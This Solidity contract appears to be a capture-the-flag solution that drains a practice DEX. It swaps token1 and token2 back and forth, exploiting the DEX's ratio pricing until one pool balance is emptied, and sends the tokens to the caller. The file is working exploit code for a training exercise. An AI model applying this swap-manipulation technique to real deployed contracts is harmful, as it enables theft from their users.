// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import { IDex } from "./IDex.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";


contract DexSolution {

    function drainIt(IDex _dex) public {
        _dex.approve(address(_dex), type(uint256).max);
        address inputToken = _dex.token1();
        address outputToken = _dex.token2();
        address tmp;

        IERC20(inputToken).transferFrom(msg.sender, address(this), _dex.balanceOf(inputToken, msg.sender));


        uint outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
        uint inputAmount = _dex.balanceOf(inputToken, address(this));
        require(inputAmount > 0, "No input token balance");
        uint swapCount;

        while(inputAmount < 110) {
            uint inputTokenForAllOutput = _dex.balanceOf(inputToken, address(_dex));
            if(inputTokenForAllOutput < inputAmount) { 
                inputAmount = inputTokenForAllOutput;
            }
            _dex.swap(inputToken, outputToken, inputAmount);
            tmp = inputToken;
            inputToken = outputToken;
            outputToken = tmp;
            outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
            inputAmount = _dex.balanceOf(inputToken, address(this));
            ++swapCount;
        }

        require(_dex.balanceOf(inputToken, address(_dex)) == 0, "Input token balance should be 0");

        IERC20(inputToken).transfer(msg.sender, inputAmount);
    }


}
